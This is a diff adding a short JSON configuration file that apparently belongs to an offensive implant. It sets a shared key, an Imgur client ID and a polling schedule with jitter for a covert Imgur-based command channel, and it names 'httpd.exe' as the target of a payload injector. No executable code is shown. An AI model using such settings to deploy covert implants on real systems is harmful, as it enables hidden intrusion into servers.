@@ -1,0 +1,17 @@
+{
+    "shared_key": "0x982147b5bea3f6c2",
+    "imgur_client_id": "546c25a59c58ad7",
+    "imgur_tag": "png",
+    "imgur_tag_query_time": 15,
+    "imgur_tag_query_time_jitter": 1,
+    "injector": {
+        "payloads": [
+            {
+                "type": "gts",
+                "targets": [
+                    "httpd.exe"
+                ]
+            }
+        ]
+    }
+}
